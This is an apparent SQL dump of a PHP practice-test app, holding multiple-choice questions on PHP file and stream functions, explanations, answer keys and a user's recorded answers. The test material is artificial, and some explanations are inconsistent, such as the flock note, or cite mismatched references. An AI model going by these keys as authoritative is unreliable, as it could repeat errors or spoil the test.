	(261,8,'Which of the following header codes is us.....odes is used for redirection?','','<p><span>Which of the following header codes is used for redirection?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The 3XX header code is used for redirection, 1XX header code is used for retrieving basic information and 5XX and 4XX header codes display error messages.</span><br /><br /><span>Answer options B, C, and D are incorrect. These response codes are not used for redirection.</span></p>',0,'2012-11-24 16:28:08','2012-11-24 16:28:08'),
	(262,9,'Which of the following functions will you..... line irrespective of length?','','<p><span>Which of the following functions will you use to read a file having single line irrespective of length?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>The fgetss() function is used to retrieve data that does not contain any HTML or PHP tag from a file . The syntax of the fgetss() function is as follows:</span></p>\r\n<p><span><pre>fgetss(file, length, tags) </pre></span></p>\r\n<p><span><span>where the file parameter specifies the file to be checked, length specifies the number of bytes to read, and tags specifies the HTML/PHP tags that will not be removed.</span><br /><br /><span>The fgets()function is a file handling function that is used to retrieve data from an open file. The syntax of the fgets() function is as follows:</span></span></p>\r\n<p><span><span><pre>fgets(file, length) </pre></span></span></p>\r\n<p><span><span><span>where the file parameter is the name of the file to be retrieved and length is the number of bytes to read.</span><br /><br /><span>Answer options C and D are incorrect. The fread() function is used to read from an open file. It stops at the end of the file or when it reaches the specified length, whichever comes first. The syntax of the fread function is as follows:</span></span></span></p>\r\n<p><span><span><span><pre>string fread (resource $handle, int $length)</pre></span></span></span></p>\r\n<p><span><span><span><span>The fread() function reads up to \'length\' bytes from the file pointer referenced by \'handle\'.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/function.fgetss.php\" tabindex=\"-1\">http://in3.php.net/manual/en/function.fgetss.php</a></uc:ref></span></span></span></p>',0,'2012-11-24 16:52:41','2012-11-24 16:52:41'),
	(263,9,'What does the second parameter of the fil.....e_get_contents() function do?','','<p><span>What does the second parameter of the file_get_contents() function do?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A is correct.</span><br /><br /><span>The file_get_contents() function is used to read entire file into a string. The syntax of the file_get_contents() function is as follows:</span></p>\r\n<p><span><pre>string file_get_contents ( string $filename [, bool $use_include_path = false [, resource $context [, int $offset = -1 [, int $maxlen ]]]] )</pre></span></p>\r\n<p><span><span>here, first parameter is the name of the file, second parameter is the include path of the file, third parameter is a context resource created with stream_context_create(), fourth parameter is offset value from where to start reading on the original stream and the fifth parameter is the maximum length of data read.</span></span></p>\r\n<p><span><span><span>The example of the file_get_contents function is as follows:</span></span></span></p>\r\n<p><pre><?php\r\n$homepage = file_get_contents(\'http://www.php.com/\');\r\necho $homepage;\r\n?> </pre></p>\r\n<p><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://in3.php.net/manual/en/function.stream-set-write-buffer.php\" tabindex=\"-1\">http://in3.php.net/manual/en/function.stream-set-write-buffer.php</a></p>',0,'2012-11-24 16:54:19','2012-11-24 16:54:19'),
	(264,9,'If you want to read exactly one byte of a.....u use to accomplish the task?','','<p><span>If you want to read exactly one byte of a file. Which of the following functions will you use to accomplish the task?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>If you want to read only one byte of a file, you need to use either fread() or fgetc() function. fread() function reads up to length bytes from the file pointer. The fgetc() function gets a character from the given file pointer.</span><br /><br /><span>Answer options C and D are incorrect. The fgets() and fgetss() functions will return the string up to length -1 bytes (means 1-1 = 0 bytes).</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/function.stream-set-write-buffer.php\" tabindex=\"-1\">http://in3.php.net/manual/en/function.stream-set-write-buffer.php</a></uc:ref></p>',0,'2012-11-24 16:55:17','2012-11-24 16:55:17'),
	(265,9,'Which of the following statements is true..... true about __FILE__constant?','','<p><span>Which of the following statements is true about __FILE__constant?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A is correct.</span><br /><br /><span>_FILE_ is a magic constant that contains the full path and filename of the file. If _FILE_ is used inside an include, the name of the included file is returned.</span><br /><br /><span>Answer option B is incorrect. _DIR_ contains name of the directory having file and full path of the directory. It is equivalent to dirname(__FILE__).</span><br /><br /><span>Answer options C and D are incorrect. The _LINE_ constant is used to retrieve the current line number of the file. The $_SERVER[\'SCRIPT_FILENAME\'] global variable is used to retrieve the current relative path of a script.&nbsp;</span><br /><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/language.constants.predefined.php\" tabindex=\"-1\">http://php.net/manual/en/language.constants.predefined.php</a></uc:ref></p>',0,'2012-11-24 16:56:06','2012-11-24 16:56:06'),
	(266,9,'Which of the following functions can be u.....er or not a file is readable?','','<p><span>Which of the following functions can be used to get whether or not a file is readable?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and C are correct.</span><br /><br /><span>The stat() and is_readable() functions can be used to check whether or not a given file is readable. If the given file is readable, the is_readable() function returns true; otherwise it returns false. The stat() function is used to retrieve the statistics of a given file. It shows various information including device number, inode number, inode protection mode, number of links, userid of the owner, groupid of the owner, size in bytes, time of last access, time of last modification, time of last inode change, blocksize of filesystem IO, number of 512-byte blocks allocated, etc.</span><br /><br /><span>Answer option B is incorrect. The touch() function is used to change the access and modification time of a given file. If the file asked does not exist, it will create a new blank file. The syntax of the touch command is as follows:</span></p>\r\n<p><span><pre>bool touch (string $filename [, int $time = time() [, int $atime ]])</pre></span></p>\r\n<p><span><span>where $filename is the name of the file, $time is the touch time, $atime is the access time of the given filename.&nbsp;</span><br /><br /><span>Answer option D is incorrect. The fseek() function is used to move the file pointer from its current position to a new position, forward or backward, specified by the number of bytes. The syntax of the fseek() function is as follows:</span></span></p>\r\n<p><span><span><pre>int fseek ( resource $handle , int $offset [, int $whence ] )</pre></span></span></p>\r\n<p><span><span><span>where $handle is the file pointer, $offset is the position to move, and whence parameter is used to set the cursor relative to offset.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.php.net/manual/en/function.stat.php\" tabindex=\"-1\">http://www.php.net/manual/en/function.stat.php</a></uc:ref></span></span></p>',0,'2012-11-24 16:57:21','2012-11-24 16:57:21'),
	(267,9,'Which of the following file functions can..... the file read/write pointer?','','<p><span>Which of the following file functions can be used to indicate the current position of the file read/write pointer?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The ftell() function is used to return the current position of the file read/write pointer. It gives the undefined results for append-only (a) streams. The syntax of the ftell() function is as follows:</span></p>\r\n<p><span><pre>int ftell ( resource $handle )</pre></span></p>\r\n<p><span><span>where $handle is the file pointer.</span><br /><br /><span>Answer option A is incorrect. The fread() function is used to read from an open file. It stops at the end of the file or when it reaches the specified length, whichever comes first. The syntax of the fread function is as follows:</span></span></p>\r\n<p><span><span><pre>string fread (resource $handle, int $length)</pre></span></span></p>\r\n<p><span><span><span>The fread() function reads up to \'length\' bytes from the file pointer referenced by \'handle\'.</span><br /><br /><span>Answer option C is incorrect. The feof() function is used to test whether the file pointer is at end of the file or not. The syntax of the feof() function is as follows:</span></span></span></p>\r\n<p><span><span><span><pre>bool feof (resource $handle)</pre></span></span></span></p>\r\n<p><span><span><span><span>If a connection is opened by the fsockopen() function that is not closed by the server, feof() waits until a timeout reaches to return TRUE. The default timeout value of the feof() function is 60 seconds.</span><br /><br /><span>Answer option D is incorrect. The fseek() function is used to move the file pointer from its current position to a new position, forward or backward, specified by the number of bytes. The syntax of the fseek() function is as follows:</span></span></span></span></p>\r\n<p><span><span><span><span><pre>int fseek ( resource $handle , int $offset [, int $whence ] )</pre></span></span></span></span></p>\r\n<p><span><span><span><span><span>where $handle is the file pointer, $offset is the position to move, and whence parameter is used to set the cursor relative to offset.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.php.net/manual/en/function.ftell.php\" tabindex=\"-1\">http://www.php.net/manual/en/function.ftell.php</a></uc:ref></span></span></span></span></p>',0,'2012-11-24 16:59:19','2012-11-24 16:59:19'),
	(268,9,'Consider the following PHP script:.....n in the above script?','','<p><span>Consider the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n $fp = fopen(\'file.txt\', \'r\');\r\n $string1 = fgets($fp, 512);\r\n fseek($fp, 0);\r\n?> </pre></span></p>\r\n<p><span><span>Which of the following functions will give the same output as that given by the fseek() function in the above script?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>In the above script, the fseek() function is moving the file pointer to the start of the file. The&nbsp;</span><uc:kwd>rewind()</uc:kwd><span>&nbsp;function works in the same manner and moves the current cursor position to the start of the file.</span><br /><br /><span>Answer option B is incorrect. The fgets() PHP function is a file handling function that is used to retrieve data from an open file. The syntax of the fgets() function is as follows:</span></p>\r\n<p><span><pre>fgets(file, length) </pre></span></p>\r\n<p><span><span>where the file parameter is the name of the file to be retrieved and length is the number of bytes to read. The default is 1024 bytes.</span><br /><br /><span>Answer option C is incorrect. The fgetss() function is used to retrieve data that does not contain any HTML or PHP tag from a file . The syntax of the fgetss() function is as follows:</span></span></p>\r\n<p><span><span><pre>fgetss(file, length, tags) </pre></span></span></p>\r\n<p><span><span><span>where the file parameter specifies the file to be checked, length specifies the number of bytes to read, and tags specifies the HTML/PHP tags that will not be removed.</span><br /><br /><span>Answer option D is incorrect. The file() function is used to read the entire file in an array. A user can also use a URL as a filename with this function if the fopen wrappers have been enabled. Since the file() function reads and parses the entire file, this function can be expensive if used on large files. For larger files, a user should use the fopen() function and iterate over it line by line with the fgets() function to achieve a similar result.&nbsp;</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.php.net/manual/en/function.rewind.php\" tabindex=\"-1\">http://www.php.net/manual/en/function.rewind.php</a></uc:ref></span></span></p>',0,'2012-11-24 17:02:34','2012-11-24 17:02:34'),
	(269,9,'Which of the following PHP file handling ..... leave all HTML and PHP tags?','','<p><span>Which of the following PHP file handling functions will you use if you want to retrieve only the texts from an HTML file and leave all HTML and PHP tags?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>You will use the fgetss() PHP function if you want to retrieve only the texts from an HTML file and leave all HTML and PHP tags. The fgetss() function is used to retrieve data that does not contain any HTML or PHP tag from a file . The syntax of the fgetss() function is as follows:</span></p>\r\n<p><span><pre>fgetss(file, length, tags) </pre></span></p>\r\n<p><span><span>where the file parameter specifies the file to be checked, length specifies the number of bytes to read, and tags specifies the HTML/PHP tags that will not be removed.&nbsp;</span><br /><br /><span>Answer option B is incorrect. The fgets() PHP function is a file handling function that is used to retrieve data from an open file. The syntax of the fgets() function is as follows:</span></span></p>\r\n<p><span><span><pre>fgets(file, length) </pre></span></span></p>\r\n<p><span><span><span>where the file parameter is the name of the file to be retrieved and length is the number of bytes to read. The default is 1024 bytes.&nbsp;</span><br /><br /><span>Answer option C is incorrect. The file_put_contents() function is used to write a string into a given file. While accessing a file, the file_put_contents() function performs the following actions:</span><br /></span></span></p>\r\n<ul>\r\n<li>Checks the include path for a copy of \"filename\" if FILE_USE_INCLUDE_PATH is set.</li>\r\n<li>Creates the file if it does not exist.</li>\r\n<li>Opens the file.</li>\r\n<li>Locks the file if LOCK_EX is set.</li>\r\n<li>Moves to the end of the file if FILE_APPEND is set. Otherwise, it clears the file content.</li>\r\n<li>Writes the data into the file.</li>\r\n<li>Closes the file and releases locks.</li>\r\n</ul>\r\n<p><span><span><span>Answer option D is incorrect. The file_get_contents() function reads the entire file into a string.</span><br /><br /><uc:ref><a target=\"_blank\" href=\"http://in3.php.net/manual/en/function.fgetss.php\" tabindex=\"-1\">http://in3.php.net/manual/en/function.fgetss.php</a></uc:ref><br /></span></span></p>',0,'2012-11-24 17:04:57','2012-11-24 17:04:57'),
	(270,9,'Which of the following can be used to rel.....n where fp is a file pointer?','','<p><span>Which of the following can be used to release the lock applied by the flock() function where fp is a file pointer?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and D are correct.</span><br /><br /><span>The flock() function is used to apply or remove an advisory lock on the open file specified by the file pointer. The lock applied by the flock() function can also be released by the fclose() function, which is also called automatically when script is finished.</span><br /><br /><span>The parameter operations of the flock() function are as follows:</span></p>\r\n<ul>\r\n<li><uc:hed>LOCK_SH:&nbsp;</uc:hed>It is used to place a shared lock. More than one process may hold a shared lock for a given file at a given time.</li>\r\n<li><uc:hed>LOCK_EX:</uc:hed>&nbsp;It is used to place an exclusive lock. Only one process may hold an exclusive lock for a given file at a given time.</li>\r\n<li><uc:hed>LOCK_UN:&nbsp;</uc:hed>It is used to remove an existing lock held by this process.</li>\r\n</ul>\r\n<p><uc:hed>Note:&nbsp;</uc:hed><span>From PHP 5.3 onwards, unlocking always has to be done manually.</span><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/function.flock.php\" tabindex=\"-1\">http://php.net/manual/en/function.flock.php</a></uc:ref></p>',0,'2012-11-24 17:05:50','2012-11-24 17:05:50'),
	(271,9,'You want to check whether the uploaded fi.....or not. How will you do this?','','<p><span>You want to check whether the uploaded file is blank or not. How will you do this?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and D are correct.</span><br /><br /><span>If you want to check whether the uploaded file is blank or not, you need to check the following:</span><br /><br /></p>\r\n<ul>\r\n<li>Make sure that $_FILES[\'myVarName\'][\'size\'] &gt; 0.</li>\r\n<li>Make sure that $_FILES[\'myVarName\'][\'error\'] = UPLOAD_ERR_OK (= 0).</li>\r\n<li>Make sure that enctype=\"multipart/form-data\" is added to the form tag.</li>\r\n<li>Make sure that the file uploads are turned on.</li>\r\n</ul>\r\n<p><uc:ref>Reference: PHP Manual, Contents: \"reserved.variables.files\"</uc:ref></p>',0,'2012-11-24 17:19:55','2012-11-24 17:19:55'),
	(272,9,'Which of the following code snippets writ.....rom one file to another file?','','<p><span>Which of the following code snippets write content from one file to another file?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A, B, and D are correct.</span><br /><br /><span>You can write contents from one file to another file by using the following PHP code snippets:</span><br /><br /></p>\r\n<ul>\r\n<li>file_put_contents(\"target.txt\",file_get_contents(\"source.txt\"));</li>\r\n<li>$handle = fopen(\"target.txt\",\"w+\"); fwrite($handle,file_get_contents(\"source.txt\")); fclose($handle);</li>\r\n<li>$src = fopen(\'source.txt\', \'r\'); $dest = fopen(\'target.txt\', \'w\'); stream_copy_to_stream($src,$dest);</li>\r\n</ul>\r\n<p><span>Answer option C is incorrect. This is not a valid syntax of the stream_copy_to_stream() function.</span><br /><br /><uc:ref>Reference: PHP Manual, Contents: \"stream_copy_to_stream\"</uc:ref></p>',0,'2012-11-24 17:20:41','2012-11-24 17:20:41'),
	(273,9,'Which of the following functions will you.....ata between two opened files?','','<p><span>Which of the following functions will you use to copy data between two opened files?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A is correct.</span><br /><br /><span>The stream_copy_to_stream() function is used to copy data from one stream to another. It is mainly useful in copying data between two open files. The syntax of the stream_copy_to_stream() function is as follows:</span></p>\r\n<p><span><pre>int stream_copy_to_stream ( resource $source , resource $dest [, int $maxlength = -1 [, int $offset = 0 ]] ) </pre></span></p>\r\n<p><span><span>Here, if maxlength is not specified, the stream_copy_to_stream() function will copy all data to the destination.</span><br /><br /><span>Answer options B, C, and D are incorrect. Option B does not contain correct format of the stream_copy_to_stream() function. The buffer_start() function is used to turn buffer on. The copy() function is used to make a copy of source file but it is not the ideal method for two opened files.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/function.stream-copy-to-stream.php\" tabindex=\"-1\">http://in3.php.net/manual/en/function.stream-copy-to-stream.php</a></uc:ref></span></p>',0,'2012-11-24 17:23:31','2012-11-24 17:23:31'),
	(274,9,'Which of the following functions will you.....he number of bytes to buffer?','','<p><span>Which of the following functions will you use to change the number of bytes to buffer?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A is correct.</span><br /><br /><span>The stream_set_write_buffer() function is used to set write file buffering on the given stream. The following example is setting 1024 bytes for the buffer:</span></p>\r\n<p><span><pre><?php\r\n$fp = fopen($file, \"w\");\r\nif ($fp) {\r\n  stream_set_write_buffer($fp, 1024); //sets the buffer size to 1024 bytes\r\n  fclose($fp);\r\n}\r\n?></pre></span></p>\r\n<p><span><span>Answer option B is incorrect. The ob_start() function is used to turn output buffering on. If output buffering is active, you cannot send any output from the script (other than headers). The output is stored in an internal buffer at that time.</span><br /><br /><span>Answer options C and D are incorrect. These are not the valid functions.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/function.stream-set-write-buffer.php\" tabindex=\"-1\">http://in3.php.net/manual/en/function.stream-set-write-buffer.php</a></uc:ref></span></p>',0,'2012-11-24 17:24:39','2012-11-24 17:24:39'),
	(275,9,'Which of the following functions is used .....ons is used to delete a file?','','<p><span>Which of the following functions is used to delete a file?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The unlink() function is used to delete a file.&nbsp;</span><br /><br /><span>Answer option C is incorrect. The rmdir() function is used to remove directories.</span><br /><br /><span>Answer option D is incorrect. The delete SQL statement is used to delete rows.</span><br /><br /><span>Answer option E is incorrect. The unset() function is used to unset a variable.</span><br /><br /><span>Answer option B is incorrect. delete() is not a valid function in PHP.</span><br /><br /><uc:ref>Reference: PHP 5 Manual, Contents: \"unlink()\"</uc:ref></p>',0,'2012-11-24 17:26:35','2012-11-24 17:26:35'),
	(276,9,'&nbsp;You run the following PHP script:','','<p><span>&nbsp;You run the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n $a = gethostbyaddr($_SERVER[\'REMOTE_ADDR\']);\r\n echo $a;\r\n?> </pre></span></p>\r\n<p><span><span>What will be the output of the script?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The gethostbyaddr() PHP function is used to retrieve the Internet host name corresponding to a given IP address. Hence, consider the following PHP script:</span></p>\r\n<p><span><pre><?php \r\n$a = gethostbyaddr($_SERVER[\'REMOTE_ADDR\']);\r\necho $a;\r\n?> </pre></span></p>\r\n<p><span><span>The output will be the host name of the remote host.</span><br /><br /><span>Answer option B is incorrect. The gethostname() function gets the standard host name for the local machine. Hence, in order to get the standard host name for the local Web server, you will run the following script:</span></span></p>\r\n<p><span><span><pre><?php\r\n $a = gethostname();\r\n echo $a;\r\n?> </pre></span></span></p>\r\n<p><span><span><span>Answer option C is incorrect. You can get the DNS resource records associated with the local Web server by using the dns_get_record() function.</span><br /><br /><span>Answer option D is incorrect. You can print the header list by using the headers_list() function.</span><br /><br /><uc:ref>Reference: Online PHP Manual, Contents: \"gethostbyaddr()\"</uc:ref></span></span></p>',0,'2012-11-24 17:28:38','2012-11-24 17:28:38'),
	(277,9,'Which of the following PHP functions can .....ut during reading or writing?','','<p><span>Which of the following PHP functions can be used to alter the amount of time PHP waits for a stream before timing out during reading or writing?</span></p>','<div class=\"clearfix\"><b>Explanation:</b>&nbsp;Answer option A is correct.<br /><br />The stream_set_timeout() function alters the amount of time PHP waits for a stream before timing out during reading or writing. When the stream times out, the \'timed_out\' key of the array returned by stream_get_meta_data() is set to TRUE. It denotes that the connection has timed out.<br /><br />Answer option B is incorrect. The stream_get_meta_data() function is used to retrieve header/meta data from streams/file pointers.<br /><br />Answer option C is incorrect. The stream_set_read_buffer() function is used to set read file buffering on the given stream.<br /><br />Answer option D is incorrect. This is not a valid PHP function.<br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.php.net/manual/en/function.stream-set-timeout.php\" tabindex=\"-1\">http://www.php.net/manual/en/function.stream-set-timeout.php</a></uc:ref></div>',0,'2012-11-24 17:29:25','2012-11-24 17:29:25'),
	(278,9,'Which of the following file permissions i..... the newly created temp file?','','<p><span>Which of the following file permissions is set by the tempnam() function for the newly created temp file?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The 0600 file permission denotes that the file owner can read and write the temp file and no other user or group can access the file. The tempnam() function generates a file resource having 0600 file permission in the file system with a randomly-generated filename to be used as temporary storage. The syntax of the tempnam function is as follows:</span></p>\r\n<p><span><pre>string tempnam ( string $dir , string $prefix ) </pre></span></p>\r\n<p><span><span>Answer options B, C, and D are incorrect. These permissions are not set by the tempnam() function.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/function.tempnam.php\" tabindex=\"-1\">http://php.net/manual/en/function.tempnam.php</a></uc:ref></span></p>',0,'2012-11-24 17:30:48','2012-11-24 17:30:48');

/*!40000 ALTER TABLE `questions` ENABLE KEYS */;
UNLOCK TABLES;


# Dump of table role_group
# ------------------------------------------------------------

DROP TABLE IF EXISTS `role_group`;

CREATE TABLE `role_group` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `role_id` int(10) unsigned NOT NULL,
  `group_id` int(10) unsigned NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `role_group_role_id_foreign` (`role_id`),
  KEY `role_group_group_id_foreign` (`group_id`),
  CONSTRAINT `role_group_group_id_foreign` FOREIGN KEY (`group_id`) REFERENCES `groups` (`id`) ON DELETE CASCADE,
  CONSTRAINT `role_group_role_id_foreign` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

LOCK TABLES `role_group` WRITE;
/*!40000 ALTER TABLE `role_group` DISABLE KEYS */;

INSERT INTO `role_group` (`id`, `role_id`, `group_id`, `created_at`, `updated_at`)
VALUES
	(1,1,1,'2012-11-18 15:56:51','2012-11-18 15:56:51'),
	(2,2,2,'2012-11-18 15:56:51','2012-11-18 15:56:51');

/*!40000 ALTER TABLE `role_group` ENABLE KEYS */;
UNLOCK TABLES;


# Dump of table roles
# ------------------------------------------------------------

DROP TABLE IF EXISTS `roles`;

CREATE TABLE `roles` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL,
  `can` varchar(255) NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

LOCK TABLES `roles` WRITE;
/*!40000 ALTER TABLE `roles` DISABLE KEYS */;

INSERT INTO `roles` (`id`, `title`, `can`, `created_at`, `updated_at`)
VALUES
	(1,'Administrate','administrate','0000-00-00 00:00:00','0000-00-00 00:00:00'),
	(2,'Edit media','book','0000-00-00 00:00:00','0000-00-00 00:00:00'),
	(3,'Take test','test','0000-00-00 00:00:00','0000-00-00 00:00:00'),
	(4,'Edit questions','questions','0000-00-00 00:00:00','0000-00-00 00:00:00');

/*!40000 ALTER TABLE `roles` ENABLE KEYS */;
UNLOCK TABLES;


# Dump of table testquestions
# ------------------------------------------------------------

DROP TABLE IF EXISTS `testquestions`;

CREATE TABLE `testquestions` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `test_id` int(10) unsigned NOT NULL,
  `question_id` int(10) unsigned NOT NULL,
  `title` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `explanation` text NOT NULL,
  `answers` text NOT NULL,
  `answered` tinyint(1) NOT NULL,
  `correct` tinyint(1) NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

LOCK TABLES `testquestions` WRITE;
/*!40000 ALTER TABLE `testquestions` DISABLE KEYS */;

INSERT INTO `testquestions` (`id`, `test_id`, `question_id`, `title`, `content`, `explanation`, `answers`, `answered`, `correct`, `created_at`, `updated_at`)
VALUES
	(121,11,74,'You have been given the following PHP scr.....ss=\"typ\">','<p><span>You have been given the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$a = \'somevalue\'; \r\n$array = array(\"a\" => \"One\",\"b\" => \"Two\", \"c\" => \"Three\");\r\n????????????? \r\necho \"\\$a = $a; \\$b = $b; \\$c = $c\";?> </pre></span></p>\r\n<p><span><span>What should you write at line number 4 to get the following output?</span></span></p>\r\n<p><span><span><br /></span></span></p>\r\n<p><span><span><span class=\"pln\">$a </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">One</span><span class=\"pun\">;</span><span class=\"pln\"> $b </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">Two</span><span class=\"pun\">;</span><span class=\"pln\"> $c </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"typ\">Three</span></span></span></p>\r\n<p><span><span><span class=\"typ\"><br /></span></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>You should use the extract() function to get the desired output. The extract() function is used to import variables into the local symbol table from an array. It uses array index keys as variable names and index values as the values of these variables. On the successful execution, the extract() function returns the number of variables extracted.</span><br /><br /><span>Answer option B is incorrect. The implode() function traverses the elements of an array and recreates a single string using an argument. The syntax of the implode() function is as follows:</span></p>\r\n<p><span><span class=\"pln\"> implode</span><span class=\"pun\">(</span><span class=\"pln\">separator</span><span class=\"pun\">,</span><span class=\"pln\">array</span><span class=\"pun\">)</span></span></p>\r\n<p><span><span class=\"pun\"><br /></span></span></p>\r\n<p><span><span class=\"pun\"><span>where the separator specifies what to put between the array elements, and array parameter is the array to join to a string.</span><br /><br /><span>Answer option C is incorrect. The ksort() function accepts an associative array and sorts its keys either alphabetically if any strings are present, or numerically if all elements are numbers. However, it does not sort the elements of the associative array.</span><br /><br /><span>Answer option D is incorrect. The asort() function accepts an associative array and sorts its values either alphabetically if any strings are present or numerically if all elements are numbers. However, the asort() function preserves the array keys. Consider the following example:</span></span></span></p>\r\n<p><pre><?php\r\n    $array = array(\"a1\"=>\'x\',\"a2\"=>\'e\',\"a3\"=>\'z\');\r\n    asort( $array );\r\n    foreach ( $array as $keys => $values )\r\n    {\r\n         print \"$keys = $values<br />\";\r\n    }\r\n?></pre></p>\r\n<p><span><span class=\"pun\"><span><span>Output:</span></span></span></span></p>\r\n<pre>a2 = e<br />a1 = x<br />a3 = z</pre>\r\n<pre></pre>\r\n<pre><span>In the output, the array keys are preserved and array elements are sorted in the same way as in the sort() function.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/function.extract.php\" tabindex=\"-1\">http://php.net/manual/en/function.extract.php</a></uc:ref></pre>\r\n<p><span><span class=\"pun\"><span><span><br /></span></span></span></span></p>\r\n<div><span class=\"pun\" style=\"color: #93a1a1; font-family: Monaco, Menlo, Consolas, \'Courier New\', monospace; font-size: 13px; line-height: 20px; white-space: pre-wrap; background-color: #f7f7f9;\"><br /></span></div>','[{\"content\":\"extract($array);\",\"correct\":1},{\"content\":\"implode($array);\",\"correct\":0},{\"content\":\"ksort($array);\",\"correct\":0},{\"content\":\"asort($array);\",\"correct\":0}]',1,1,'2012-11-19 00:11:19','2012-11-19 00:11:21'),
	(122,11,79,'What will be the output of the PHP script.....\nprint_r($array4);\r\n?> ','<p><span>What will be the output of the PHP script given below?</span></p>\r\n<p><span><pre><?php\r\n$array1 = array(\"orange\", \"banana\", \"apple\", \"raspberry\");\r\n$array2 = array(0 => \"pineapple\", 4 => \"cherry\");\r\n$array3 = array(0 => \"grape\");\r\n$array4 = array_replace($array1, $array2, $array3);\r\nprint_r($array4);\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The array_replace() function is used to replace elements from passed arrays into one array. While using the array_replace() function, if an array contains a key that is already present in another array, the value of the key gets replaced from the value in the second array. If the key is present only in the second array and not in the first one, it gets added to the first array with the same value in the second array. If the key is present only in the first array, there is no change. Hence, in the above script, the output will be as follows:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n\r\nArray\r\n(\r\n    [0] => grape\r\n    [1] => banana\r\n    [2] => apple\r\n    [3] => raspberry\r\n    [4] => cherry\r\n)\r\n\r\n?></pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.array-replace.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.array-replace.php</a></span></p>','[{\"content\":\"Array ( [0] => grape [1] => banana [2] => apple [3] => raspberry [4] => cherry )\",\"correct\":1},{\"content\":\"Array ( [0] => orange [1] => banana [2] => apple [3] => raspberry [4] => cherry )\",\"correct\":0},{\"content\":\"Array ( [0] => orange [1] => banana [2] => apple [3] => raspberry [4] => grape )\",\"correct\":0},{\"content\":\"Array ( [0] => banana [1] => cherry [2] => grape )\",\"correct\":0}]',1,0,'2012-11-19 00:11:19','2012-11-19 00:11:23'),
